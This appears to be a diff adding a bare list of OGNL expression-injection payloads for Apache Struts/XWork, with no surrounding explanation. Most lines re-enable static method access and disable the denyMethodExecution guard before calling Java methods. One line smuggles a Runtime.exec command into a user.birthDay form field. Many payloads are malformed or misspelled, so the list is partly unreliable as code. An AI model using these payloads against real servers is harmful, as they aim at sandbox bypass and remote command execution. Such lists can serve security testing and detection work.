@@ -1,0 +1,51 @@
+%{#_memberAccess.allowStaticMethodAccess=true,   #context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
+%{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Thread@sleep()}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@com.atlassian.core.util.ClassHelper@instantiateClass(a,b)}
+%{#_memberAccess.allowStaticMethodAccess=true,   #context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
+%{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Thread@sleep()}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = new java.lang.ThreadLocal(@Override  protected Connection initialValue() { return createConnection();})a.initialValue()}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @java.lang.Package@getPackage("")}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @java.lang.ClassLoader@a}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @com.atlassian.core.util.ClassLoaderUtilsloadClass@loadClass(a,b)}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),#f.setAccessible(true),#unsafe=#f.get(null)}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.String("test").getClass().getClassLoader()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@disable()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@compileClass(new java.lang.String("test").getClass())}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@command("javac java.lang.String")}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.String("test"),#a.getClass()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Process().destroy()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationVendor()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationTitle()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new javax.persistence.EntityManager(){public void clear(){}}.clear()}
+user.name=glassy&user.age=12&user.birthDay='+(#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))+'&user.email=31312@qq.com
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.inheritableThreadlocal.get()
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false, java.lang.ThreadLocal@remove()
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Process @waitfor()}
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@Java.lang.Object @waitfor()}
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Class  @getEnclosingClass()}
+%{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ClassLoader @clearAssertionStatus()}
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.script.ScriptEngineManage@getEngineByName("JavaScript")
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.persistence.EntityManager@remove("")
+%{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.servlet.ServletContext@removeAttribute(String name)
+%{#_memberAccess.allowStaticMethodAccess=true  ,@java.io.BufferedInputStream@close()}
+%{#_memberAccess.allowStaticMethodAccess=true  ,java.io.BufferedInputStream@Close()}
+%{#_memberAccess.allowStaticMethodAccess=true ,java.io.ByteArrayInputStream@close() }
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.FileOutputStream@hashCode()}
+%{#_memberAccess.allowStaticMethodAccess=true,#excludeProperties=@java.util.Collections@EMPTY_SET@java.io.FilteroutStream@close() }
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.LineNumberReader@readLine()}
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.RandomAccessFile.close()}
+%{#_memberAccess['allowPrivateAccess']=true,@java.io.CharArrayWriter.append('c')
+%{#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS，@java.lang@avaoableProcessors()
+%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),java.io.Console@readPassword() }
+%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.io.PrintStream@close()}
+%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.InputStreamReader@close()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@Java.io.File@sync()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.FileOutputStream@hashCode() }
+%{#context["xwork.MethodAccessor.denyMethodExecution"]=false ，@java.io.FilterWriter@available()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.InputStreamReader.getEncoding()}
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedInputStream@close()
+%{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedOutputStream.Write(5)
